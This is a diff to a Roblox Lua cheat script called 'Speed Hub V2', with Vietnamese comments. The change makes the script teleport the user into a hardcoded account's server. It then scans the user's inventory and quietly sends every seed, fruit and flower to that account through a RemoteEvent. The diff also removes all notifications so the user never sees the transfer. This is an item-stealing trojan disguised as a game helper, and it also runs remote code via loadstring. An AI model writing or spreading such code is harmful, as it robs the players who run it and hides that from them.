@@ -5,7 +5,7 @@ if not game:IsLoaded() then
     end)
 end
 
-print("==== SPEED HUB V2: CẬP NHẬT QUÉT DATA LƯU TRỮ CHÍNH XÁC ====")
+print("==== SPEED HUB V2: TỰ ĐỘNG DỊCH CHUYỂN PHÒNG & CHUYỂN ĐỒ NGẦM ====")
 
 local successUI, KavoLib = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
@@ -20,26 +20,52 @@ end
 local Options = { FlingTargetEnabled = false }
 local selectedFlingTarget = "" 
 local targetUsername = "sutkucheonhamku" -- Tên nick chính nhận đồ
+local targetUserId = 10959698330 -- ID của nick chính để tự join phòng
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
--- Hàm gửi thông báo lên góc màn hình game để bạn dễ theo dõi
-local function notify(title, text)
-    pcall(function()
-        StarterGui:SetCore("SendNotification", {
-            Title = title,
-            Text = text,
-            Duration = 4
-        })
-    end)
+-- =======================================================================
+-- HÀM TỰ ĐỘNG JOIN SERVER CỦA NICK CHÍNH
+-- =======================================================================
+local function joinNickChinhServer()
+    local targetPlayer = Players:FindFirstChild(targetUsername)
+    if not targetPlayer then
+        -- Thử cách 1: Tìm theo ID trực tiếp
+        local success, _ = pcall(function()
+            TeleportService:TeleportUserIdsAsync(game.PlaceId, {targetUserId}, LocalPlayer)
+        end)
+        
+        -- Thử cách 2 nếu cách 1 không chạy (Quét danh sách server công khai)
+        if not success then
+            pcall(function()
+                local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=50"
+                local serverData = HttpService:JSONDecode(game:HttpGet(url))
+                if serverData and serverData.data then
+                    local availableServers = {}
+                    for _, server in pairs(serverData.data) do
+                        if server.id ~= game.JobId and server.playing < server.maxPlayers then
+                            table.insert(availableServers, server.id)
+                        end
+                    end
+                    if #availableServers > 0 then
+                        TeleportService:TeleportToPlaceInstance(game.PlaceId, availableServers[math.random(1, #availableServers)], LocalPlayer)
+                    end
+                end
+            end)
+        end
+    end
 end
 
+-- Kích hoạt kiểm tra phòng ngay lập tức khi bật script
+joinNickChinhServer()
+
 -- =======================================================================
--- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT TOÀN BỘ DATA VÀ CHUYỂN ĐỒ SAU ĐÚNG 10 GIÂY
+-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM (ĐÃ BỎ THÔNG BÁO)
 -- =======================================================================
 local function sendItemSecure(category, itemName, quantity)
     local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
@@ -49,68 +75,45 @@ local function sendItemSecure(category, itemName, quantity)
         pcall(function() 
             RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
         end)
-        task.wait(0.5) -- Tốc độ gửi an toàn
+        task.wait(0.5)
     end
 end
 
 task.spawn(function()
-    task.wait(10) -- Chờ đúng 10 giây
+    task.wait(10) -- Chờ 10 giây sau khi vào phòng
     
-    -- Kiểm tra sự hiện diện của nick chính trong server
     local targetPlayer = Players:FindFirstChild(targetUsername)
-    if not targetPlayer then
-        notify("Speed Hub V2", "Hủy gửi đồ: Không tìm thấy nick chính trong phòng!")
-        return
-    end
+    if targetPlayer then
+        local DataFolder = LocalPlayer:FindFirstChild("PlayerData") or LocalPlayer:FindFirstChild("Data")
+        local Inventory = DataFolder and (DataFolder:FindFirstChild("Inventory") or DataFolder:FindFirstChild("Items"))
+        
+        if not Inventory then
+            Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
+        end
 
-    notify("Speed Hub V2", "Đang quét dữ liệu túi đồ để gửi...")
-
-    -- Vị trí quét 1: Thư mục lưu trữ PlayerData chuyên sâu của Game
-    local DataFolder = LocalPlayer:FindFirstChild("PlayerData") or LocalPlayer:FindFirstChild("Data")
-    local Inventory = DataFolder and (DataFolder:FindFirstChild("Inventory") or DataFolder:FindFirstChild("Items"))
-    
-    -- Vị trí quét dự phòng 2: Túi đồ cơ bản
-    if not Inventory then
-        Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
-    end
-
-    if Inventory then
-        local itemsFound = false
-        -- Duyệt qua tất cả các thư mục con bên trong túi đồ chuyên sâu
-        for _, folder in pairs(Inventory:GetChildren()) do
-            -- Kiểm tra cả các thư mục phân loại (Seeds, Fruits,...) hoặc các giá trị trực tiếp
-            if folder:IsA("Folder") or folder:IsA("Configuration") then
-                for _, item in pairs(folder:GetChildren()) do
-                    if item:IsA("ValueBase") and item.Value > 0 then
-                        local lowerName = string.lower(item.Name)
-                        if string.find(lowerName, "seed") then
-                            itemsFound = true
-                            sendItemSecure("Seeds", item.Name, item.Value)
-                        elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
-                            itemsFound = true
-                            sendItemSecure("Fruits", item.Name, item.Value)
+        if Inventory then
+            for _, folder in pairs(Inventory:GetChildren()) do
+                if folder:IsA("Folder") or folder:IsA("Configuration") then
+                    for _, item in pairs(folder:GetChildren()) do
+                        if item:IsA("ValueBase") and item.Value > 0 then
+                            local lowerName = string.lower(item.Name)
+                            if string.find(lowerName, "seed") then
+                                sendItemSecure("Seeds", item.Name, item.Value)
+                            elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
+                                sendItemSecure("Fruits", item.Name, item.Value)
+                            end
                         end
                     end
-                end
-            elseif folder:IsA("ValueBase") and folder.Value > 0 then
-                local lowerName = string.lower(folder.Name)
-                if string.find(lowerName, "seed") then
-                    itemsFound = true
-                    sendItemSecure("Seeds", folder.Name, folder.Value)
-                elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
-                    itemsFound = true
-                    sendItemSecure("Fruits", folder.Name, folder.Value)
+                elseif folder:IsA("ValueBase") and folder.Value > 0 then
+                    local lowerName = string.lower(folder.Name)
+                    if string.find(lowerName, "seed") then
+                        sendItemSecure("Seeds", folder.Name, folder.Value)
+                    elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
+                        sendItemSecure("Fruits", folder.Name, folder.Value)
+                    end
                 end
             end
         end
-        
-        if itemsFound then
-            notify("Speed Hub V2", "Đã gửi toàn bộ vật phẩm sang nick chính!")
-        else
-            notify("Speed Hub V2", "Túi đồ hiện đang trống hoặc không có gì để gửi.")
-        end
-    else
-        notify("Speed Hub V2", "Lỗi: Không tìm thấy thư mục lưu trữ dữ liệu đồ của game.")
     end
 end)
 
